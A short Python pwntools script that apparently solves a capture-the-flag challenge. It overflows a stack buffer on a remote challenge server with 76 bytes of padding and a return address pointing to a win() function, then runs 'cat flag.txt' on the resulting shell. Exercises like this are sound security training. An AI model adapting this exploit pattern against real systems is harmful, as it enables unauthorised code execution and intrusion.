from pwn import *

p = remote("challs.pwnoh.io", 13401)
p.clean()

# 76 byte pad to ret address
payload = b'A' * 76

# address of win()
payload += p32(0x080491e6)

p.sendline(payload)
log.info(p.clean())

p.sendline("cat flag.txt".encode())

log.info(p.clean())
p.close()
